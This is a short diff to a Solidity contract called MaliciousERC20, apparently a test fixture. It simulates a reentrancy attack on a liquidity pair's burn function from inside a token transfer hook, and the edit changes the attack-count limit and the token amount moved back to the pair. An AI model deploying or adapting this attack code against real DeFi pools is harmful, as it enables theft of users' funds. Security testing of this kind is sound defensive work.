@@ -62,20 +62,17 @@ contract MaliciousERC20 is CustomERC20 {
         internal
         override
     {
-        if (_attackOn["BURN"] == 1 && _attackCount < 4) {
+        if (_attackOn["BURN"] == 1 && _attackCount < 3) {
             _attackCount++;
 
             if (from == _pair && to == _recipient) {
                 console.log("*--[Hack] Burn: attack call start");
                 console.log("|");
-
-                // uint256 balance = IERC20(_pair).balanceOf(_recipient);
                 
+                IERC20(_pair).transferFrom(_recipient, _pair, 2500 * 10 ** 18);
                 
                 IPair(_pair).burn(_recipient);
                 
-                IERC20(_pair).transferFrom(_recipient, _pair, 1000 * 10 ** 18);
-
                 console.log("|");
                 console.log("*--[Hack] Burn: attack call end");
                 console.log(" \\_____________________________");
